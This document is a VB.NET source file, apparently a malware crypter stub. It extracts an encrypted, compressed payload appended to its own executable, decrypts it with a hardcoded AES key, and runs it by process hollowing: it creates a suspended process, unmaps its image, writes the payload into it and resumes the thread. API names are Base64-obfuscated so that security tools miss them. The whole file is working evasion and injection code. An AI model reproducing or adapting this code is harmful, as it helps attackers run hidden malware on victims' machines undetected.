Public Class Class1
    Sub Main(ByVal AppPath As String)
        Dim Payload() As Byte = GetPload(AppPath)
        Dim i As Integer = FindSplit(Payload)
        Dim Start As Integer = i
        Dim NewByts() As Byte = RedimPload(Payload, Start)
        NewByts = Loop1(NewByts, Payload, Start)
        NewByts = Loop2(NewByts)
        W00t(AES_Decrypt(Decompress(NewByts)), AppPath)
    End Sub
    Public Shared Function Decompress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Function Loop2(ByVal NewByts() As Byte) As Byte()
        Dim Tmp() As Byte = NewByts
        Dim I As Integer = FindSplit(NewByts) - 7
        ReDim NewByts(0 To I)
        For I = 0 To NewByts.Length - 1
            NewByts(I) = Tmp(I)
        Next
        Return NewByts
    End Function
    Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
        For i = 0 To NewByts.Length - 1
            NewByts(i) = Payload(Start + i)
        Next
        Return NewByts
    End Function

    Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
        Return NewByts
    End Function
    Function GetPload(ByVal AppPath As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(AppPath)
    End Function
    Private Function GPA(ByVal hProcess As IntPtr, ByVal Name As String)
        Return Invoke(B64Decode("a2VybmVsMzI="), B64Decode("R2V0UHJvY0FkZHJlc3M="), New Object() {hProcess, Name}, GetType(IntPtr))
    End Function
    Private Function LLBRY(ByVal Name As String) As IntPtr
        Return Invoke(B64Decode("a2VybmVsMzI="), B64Decode("TG9hZExpYnJhcnlB"), New Object() {Name}, GetType(IntPtr))
    End Function

    Function Invoke(dll As String, name As String, parameters As Object(), returnType As Type) As Object
        Dim typeList As New List(Of Type)()
        For i As Integer = 0 To parameters.Length - 1
            typeList.Add(parameters(i).[GetType]())
        Next

        Dim A As Reflection.Emit.AssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(New Reflection.AssemblyName(B64Decode("RHluYW1pY0ludm9rZURsbA==")), Reflection.Emit.AssemblyBuilderAccess.Run)
        Dim M As Reflection.Emit.ModuleBuilder = A.DefineDynamicModule(B64Decode("TUI="))
        Dim MB As Reflection.Emit.MethodBuilder = M.DefinePInvokeMethod(name, dll, Reflection.MethodAttributes.[Public] Or Reflection.MethodAttributes.[Static] Or Reflection.MethodAttributes.PinvokeImpl, Reflection.CallingConventions.Standard, returnType, typeList.ToArray(),
            Runtime.InteropServices.CallingConvention.Winapi, Runtime.InteropServices.CharSet.Ansi)
        MB.SetImplementationFlags(Reflection.MethodImplAttributes.PreserveSig)
        M.CreateGlobalFunctions()
        Dim x As Reflection.MethodInfo = M.GetMethod(name)
        Return x.Invoke(Nothing, parameters)
    End Function

    Private Function HiddenWinCallz(Of T)(ByVal Name As String, ByVal Method As String) As T
        Return DirectCast(DirectCast(Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(GPA(LLBRY(Name), Method), GetType(T)), Object), T)
    End Function



    Private Delegate Function MemParm(ByVal hProcess As UInteger, ByVal lpBaseAddress As IntPtr, ByRef lpBuffer As Integer, ByVal nSize As IntPtr, ByRef lpNumberOfBytesWritten As IntPtr) As Boolean
    ReadOnly RPM_L As MemParm = HiddenWinCallz(Of MemParm)(B64Decode("a2VybmVsMzI="), B64Decode("UmVhZFByb2Nlc3NNZW1vcnk="))

    Private Delegate Function CPP(
    ByVal AppleN As String,
    ByVal CMD As String,
    ByVal PA As IntPtr,
    ByVal TA As IntPtr,
    ByVal IH As Boolean,
    ByVal CF As UInteger,
    ByVal ENV As IntPtr,
    ByVal CWD As String,
    ByRef ST_I As ST_I,
    ByRef ProInf As P_I) As Boolean
    Dim CreateProcess As CPP = HiddenWinCallz(Of CPP)(B64Decode("a2VybmVsMzI="), B64Decode("Q3JlYXRlUHJvY2Vzc0E="))

    Private Delegate Function NTQPP(ByVal hProcess As IntPtr,
    ByVal ProInfCl As Integer,
    ByRef ProInf As P_B_I,
    ByVal ProcessInformationLength As UInteger,
    ByRef ReturnLength As UIntPtr) As UInteger
    ReadOnly NtQueryInformationProcess As NTQPP = HiddenWinCallz(Of NTQPP)(B64Decode("bnRkbGw="), B64Decode("TnRRdWVyeUluZm9ybWF0aW9uUHJvY2Vzcw=="))

    Private Delegate Function GTC6P(
    ByVal hThread As IntPtr,
    ByRef lpContext As CT32) As Boolean
    Dim GTC6 As GTC6P = Nothing

    Private Delegate Function IWOW(
    ByVal hProcess As IntPtr,
    ByRef Wow64Process As Boolean) As Boolean
    ReadOnly IsWow64Process As IWOW = HiddenWinCallz(Of IWOW)(B64Decode("a2VybmVsMzI="), B64Decode("SXNXb3c2NFByb2Nlc3M="))

    Private Delegate Function WPMP(
    ByVal hProcess As IntPtr,
    ByVal lpBaseAddress As IntPtr,
    ByVal lpBuffer As Byte(),
    ByVal nSize As UInteger,
    ByRef lpNumberOfBytesWritten As UInteger) As Boolean
    ReadOnly WriteProcessMemory As WPMP = HiddenWinCallz(Of WPMP)(B64Decode("a2VybmVsMzI="), B64Decode("V3JpdGVQcm9jZXNzTWVtb3J5"))

    Private Delegate Function NVSP(
    ByVal hProcess As IntPtr,
    ByVal pBaseAddress As IntPtr) As UInteger
    ReadOnly NtUnmapViewOfSection As NVSP = HiddenWinCallz(Of NVSP)(B64Decode("bnRkbGw="), B64Decode("TnRVbm1hcFZpZXdPZlNlY3Rpb24="))

    Private Delegate Function VAEP(
    ByVal hProcess As IntPtr,
    ByVal lpAddress As IntPtr,
    ByVal dwSize As UInteger,
    ByVal flAllocationType As UInteger,
    ByVal flProtect As UInteger) As IntPtr
    ReadOnly VirtualAllocEx As VAEP = HiddenWinCallz(Of VAEP)(B64Decode("a2VybmVsMzI="), B64Decode("VmlydHVhbEFsbG9jRXg="))

    Private Delegate Function RTP(
    ByVal hThread As IntPtr) As UInteger
    ReadOnly ResumeThread As RTP = HiddenWinCallz(Of RTP)(B64Decode("a2VybmVsMzI="), B64Decode("UmVzdW1lVGhyZWFk"))


    Private Structure P_I
        Public hProcess As IntPtr
        Public hThread As IntPtr
        Public dwProcessId As UInteger
        Public dwThreadId As UInteger
    End Structure
    Private Structure ST_I
        Public cb As UInteger
        Public lpReserved As String
        Public lpDesktop As String
        Public lpTitle As String
        <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst:=36)>
        Public Misc As Byte()
        Public lpReserved2 As Byte
        Public hStdInput As IntPtr
        Public hStdOutput As IntPtr
        Public hStdError As IntPtr
    End Structure
    Structure F_S_A
        Dim Control, Status, Tag, ErrorO, ErrorS, DataO, DataS As UInteger
        <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst:=80)> Dim RegisterArea As Byte()
        Dim State As UInteger
    End Structure
    Structure CT32
        Dim ContextFlags, Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 As UInteger
        Dim FloatSave As F_S_A
        Dim SegGs, SegFs, SegEs, SegDs, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SegCs, EFlags, Esp, SegSs As UInteger
        <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst:=512)> Dim ExtendedRegisters As Byte()
    End Structure
    Structure P_B_I
        Public ExitStatus As IntPtr
        Public PebBaseAddress As IntPtr
        Public AffinityMask As IntPtr
        Public BasePriority As IntPtr
        Public UniqueProcessID As IntPtr
        Public InheritedFromUniqueProcessId As IntPtr
    End Structure


    Public Function W00t(ByVal payload As Byte(), ByVal AppPath As String) As Boolean
        For I As Integer = 0 To 4
            If ThreadStartz(AppPath, payload, 0) Then Return True
        Next
        Return False
    End Function

    Private Function ThreadStartz(ByVal Path As String, ByVal payload As Byte(), ByVal creationflag As Integer) As Boolean
        Dim ReadWrite As Integer = Nothing
        Dim QuotedPath As String = String.Format("""{0}""", Path)

        Dim SI As New ST_I
        Dim PI As New P_I

        SI.cb = CUInt(Runtime.InteropServices.Marshal.SizeOf(GetType(ST_I))) 'Parses the size of the structure to the structure, so it retrieves the right size of data

        Try
            'COMMENT: Creating a target process in suspended state, which makes it patch ready and we also retrieves its process information and startup information.
            If Not CreateProcess(Path, QuotedPath, IntPtr.Zero, IntPtr.Zero, True, creationflag, IntPtr.Zero, IO.Directory.GetCurrentDirectory, SI, PI) Then Throw New Exception()

            'COMMENT: Defines some variables we need in the next process
            Dim ProccessInfo As New P_B_I
            Dim RetLength As UInteger
            Dim Context = Nothing
            Dim PEBAddress32 As Integer = Nothing
            Dim PEBAddress64 As Int64 = Nothing
            Dim TargetIs64 As Boolean = Nothing
            Dim IsWow64Proc As Boolean = False

            IsWow64Process(PI.hProcess, IsWow64Proc) 'COMMENT: Retrieves Boolean to know if target process is a 32bit process running in 32bit system, or a 32bit process running under WOW64 in a 64bit system.
            If IsWow64Proc Or IntPtr.Size = 4 Then 'COMMENT: Checks the Boolean retrieved from before OR checks if our calling process is 32bit
                Context = New CT32
                Context.ContextFlags = &H1000002L 'COMMENT: Parses the context flag CONTEXT_AMD64(&H00100000L) + CONTEXT_INTEGER(0x00000002L) to tell that we want a structure of a 32bit process running under WOW64, you can see all context flags in winnt.h header file.
                If IsWow64Proc AndAlso IntPtr.Size = 8 Then 'COMMENT: Checks if our own process is 64bit and the target process is 32bit in wow64
                    GTC6 = HiddenWinCallz(Of GTC6P)(B64Decode("a2VybmVsMzI="), B64Decode("V293NjRHZXRUaHJlYWRDb250ZXh0")) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                    If Not GTC6(PI.hThread, Context) Then Throw New Exception
                    Console.WriteLine(Context.Ebx)
                    PEBAddress32 = Context.Ebx
                    TargetIs64 = False
                Else 'COMMENT: If our process is 32bit and the target process is 32bit we get here.
                    NtQueryInformationProcess(PI.hProcess, 0, ProccessInfo, Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), RetLength) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                    PEBAddress32 = ProccessInfo.PebBaseAddress
                    TargetIs64 = False
                End If
            Else 'COMMENT: If our process is 64bit and the target process is 64bit we get here.
                NtQueryInformationProcess(PI.hProcess, 0, ProccessInfo, Runtime.InteropServices.Marshal.SizeOf(ProccessInfo), RetLength) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                PEBAddress64 = ProccessInfo.PebBaseAddress
                TargetIs64 = True
            End If


            Dim BaseAddress As IntPtr
            If TargetIs64 = True Then
                RPM_L(PI.hProcess, PEBAddress64 + &H10, BaseAddress, 4, ReadWrite) 'COMMENT: Reads the BaseAddress of a 64bit Process, which is where the exe data starts
            Else
                RPM_L(PI.hProcess, PEBAddress32 + &H8, BaseAddress, 4, ReadWrite) 'COMMENT: Reads the BaseAddress of a 32bit Process, which is where the exe data starts
            End If

            Dim PayloadIs64 As Boolean = False
            Dim dwPEHeaderAddress As Integer = BitConverter.ToInt32(payload, &H3C) 'COMMENT: Gets the PEHeader start address
            Dim dwNetDirFlags As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H398) 'COMMENT: Gets the .NET Header Flags value to determine if its a AnyCPU Compiled exe or not
            Dim wMachine As Integer = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H4) 'COMMENT: Gets the reads the Machine value

            If wMachine = 8664 Then : PayloadIs64 = True 'Checks the Machine value to know if payload is 64bit or not"
            Else : PayloadIs64 = False : End If

            If PayloadIs64 = False Then
                If dwNetDirFlags = &H3 Then 'To make sure we don't rewrite flags on a Payload which is already AnyCPU Compiled, it will only slow us down
                    Buffer.SetByte(payload, dwPEHeaderAddress + &H398, &H1) 'Replaces the .NET Header Flag on a 32bit compiled payload, to make it possible doing 32bit -> 64bit injection
                End If
            End If

            Dim dwImageBase As Integer
            If PayloadIs64 = True Then
                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H30) 'Reads the ImageBase value of a 64bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual addressstart location for our exe in its own memory space
            Else
                dwImageBase = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H34) 'Reads the ImageBase value of a 32bit payload, it's kind of unnessecary as ImageBase should always be: &H400000, this is the virtual address start location for our exe in its own memory space
            End If

            If dwImageBase = BaseAddress Then 'COMMENT: If the BaseAddress of our Exe is matching the ImageBase, it's because it's mapped and we have to unmap it
                If Not NtUnmapViewOfSection(PI.hProcess, BaseAddress) = 0 Then Throw New Exception() 'COMMENT: Unmapping it
            End If

            Dim dwSizeOfImage As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H50)
            Dim dwNewImageBase As Integer = VirtualAllocEx(PI.hProcess, dwImageBase, dwSizeOfImage, &H3000, &H40) 'COMMENT: Makes the process ready to write in by specifying how much space we need to do it and where we need it
            If dwNewImageBase = 0 Then Throw New Exception()

            Dim dwSizeOfHeaders As Integer = BitConverter.ToInt32(payload, dwPEHeaderAddress + &H54)
            If Not WriteProcessMemory(PI.hProcess, dwNewImageBase, payload, dwSizeOfHeaders, ReadWrite) Then Throw New Exception() 'Writes the size of the payloads PE header to the target

            'COMMENT: This is here where most of the magic happens. We write in all our sections data, which contains our resssources, code and the information to utilize the sections: VirtualAddress, SizeOfRawData and PointerToRawData
            Dim SizeOfOptionalHeader As Short = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H14)
            Dim SectionOffset As Integer = dwPEHeaderAddress + (&H16 + SizeOfOptionalHeader + &H2)
            Dim NumberOfSections As Short = BitConverter.ToInt16(payload, dwPEHeaderAddress + &H6)
            For I As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = BitConverter.ToInt32(payload, SectionOffset + &HC)
                Dim SizeOfRawData As Integer = BitConverter.ToInt32(payload, SectionOffset + &H10)
                Dim PointerToRawData As Integer = BitConverter.ToInt32(payload, SectionOffset + &H14)
                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    Buffer.BlockCopy(payload, PointerToRawData, SectionData, 0, SectionData.Length)
                    If Not WriteProcessMemory(PI.hProcess, dwNewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
                End If
                SectionOffset += &H28
            Next

            Dim PointerData As Byte() = BitConverter.GetBytes(dwNewImageBase)
            If TargetIs64 = True Then
                If Not WriteProcessMemory(PI.hProcess, PEBAddress64 + &H10, PointerData, 4, ReadWrite) Then Throw New Exception() 'Writes the new etrypoint for 64bit target
            Else
                If Not WriteProcessMemory(PI.hProcess, PEBAddress32 + &H8, PointerData, 4, ReadWrite) Then Throw New Exception() 'Writes the new entrypoint for 32bit target
            End If
            If ResumeThread(PI.hThread) = -1 Then Throw New Exception() 'Resumes the suspended target with all its new exciting data

        Catch ex As Exception
            Dim P As Process = Process.GetProcessById(CInt(PI.dwProcessId))
            If P IsNot Nothing Then P.Kill()
            Return False
        End Try

        Return True
    End Function

    Function B64Decode(ByVal TheSTr As String) As String
        Dim decodedBytes As Byte()
        decodedBytes = Convert.FromBase64String(TheSTr)
        Dim decodedText As String
        decodedText = System.Text.Encoding.UTF8.GetString(decodedBytes)
        Return decodedText
    End Function

    Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try

    End Function

    Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        Return I + 1
    End Function
End Class
